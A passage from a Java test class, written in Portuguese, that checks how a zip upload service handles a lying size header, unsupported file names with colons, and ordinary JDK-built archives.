        assertThat(r.status()).isIn(200, 422);
        Res empty = up(new RawZip().bytes(), null);
        assertThat(empty.status()).isEqualTo(200);
        assertThat(empty.node().get("created").asInt()).isZero();
    }

    @Test
    @DisplayName("entrada STORED com tamanho declarado mentindo e descompressão que passa do declarado: a contagem é pelos bytes lidos, não pelo cabeçalho")
    void cabecalhoMente() throws Exception {
        // zip normal de 100 KB de zeros...
        byte[] zip = new RawZip().addZeros("a.md", 100L * 1024).bytes();
        // ...com o tamanho descomprimido do cabeçalho trocado por 1 byte (o JDK ignora e o leitor conta pelo fluxo)
        java.nio.ByteBuffer.wrap(zip).order(java.nio.ByteOrder.LITTLE_ENDIAN).putInt(22, 1);
        Res r = up(zip, null);
        assertThat(r.status()).isIn(200, 422);
        if (r.status() == 200) {
            assertThat(r.node().get("created").asInt() + r.node().get("ignoredFiles").size()).isEqualTo(1);
        }
    }

    @Test
    @DisplayName("nome 'Q: dúvida.md' (letra + dois-pontos, válido no macOS/Linux) não pode derrubar o zip inteiro: deve ser ignorado e listado como os demais nomes sem suporte")
    void letraEDoisPontos() throws Exception {
        Res r = up(new RawZip().add("ok.md", "boa").add("Q: dúvida.md", "x").bytes(), null);
        assertThat(r.status()).as("%s", r).isEqualTo(200);
        assertThat(r.node().get("created").asInt()).isEqualTo(1);
    }

    @Test
    @DisplayName("sanidade: o ZipOutputStream do JDK com entradas DEFLATED, STORED com CRC e diretórios continua sendo lido")
    void sanidade() throws Exception {
        java.io.ByteArrayOutputStream bytes = new java.io.ByteArrayOutputStream();
        try (ZipOutputStream out = new ZipOutputStream(bytes)) {
            out.putNextEntry(new ZipEntry("d/"));
            out.closeEntry();
            ZipEntry stored = new ZipEntry("stored.md");
            byte[] data = "armazenada".getBytes(StandardCharsets.UTF_8);
            stored.setMethod(ZipEntry.STORED);
            stored.setSize(data.length);
            stored.setCompressedSize(data.length);
            java.util.zip.CRC32 crc = new java.util.zip.CRC32();
            crc.update(data);
            stored.setCrc(crc.getValue());
            out.putNextEntry(stored);
            out.write(data);
            out.closeEntry();
            out.putNextEntry(new ZipEntry("d/deflated.md"));
            out.write("comprimida".getBytes(StandardCharsets.UTF_8));
            out.closeEntry();
        }
        Res r = up(bytes.toByteArray(), null);
        assertThat(r.status()).isEqualTo(200);
        assertThat(paths()).containsExactly("d/deflated.md", "stored.md");
        JsonNode report = r.node();
        assertThat(report.get("created").asInt()).isEqualTo(2);
    }
}
